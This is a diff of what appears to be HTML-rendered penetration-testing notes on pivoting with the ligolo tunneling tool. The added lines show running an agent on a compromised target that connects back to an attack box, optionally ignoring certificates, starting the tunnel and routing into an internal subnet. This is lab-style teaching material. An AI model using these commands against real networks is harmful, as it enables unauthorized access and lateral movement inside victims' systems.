@@ -363,11 +363,20 @@ ligolo <span class="nt">-selfcert</span>
 <span class="c"># On target machine, upload the agent and run it to our attack box:</span>
 ./ligolo-agent <span class="nt">-connect</span> &lt;attack box IP&gt;:11601
 
-<span class="c"># From our ligolo proxy interface, start the tunnel:</span>
-start
+<span class="c"># If you don't mind ignoring the cert (you shouldn't!!), you can:</span>
+./ligolo-agent <span class="nt">-ignore-cert</span> <span class="nt">-connect</span> &lt;attack box IP&gt;:11601
+
+<span class="c"># From our ligolo proxy interface, start the session created:</span>
+session
+
+<span class="c"># And start the tunnel:</span>
+start <span class="nt">--tun</span> &lt;tun interface name, username <span class="k">if </span>you followed previous commands&gt;
 
 <span class="c"># Add the desired subnet we want to enumerate / exploit from our target:</span>
 <span class="nb">sudo </span>ip route add &lt;target subnet address&gt;/24 dev <span class="s2">"</span><span class="si">$(</span><span class="nb">whoami</span><span class="si">)</span><span class="s2">"</span>
+
+<span class="c"># Check if it worked:</span>
+ip route
 
 <span class="c"># We can now talk directly to the internal subnet:</span>
 ping <span class="nt">-c</span> 5 &lt;IP from target subnet&gt;
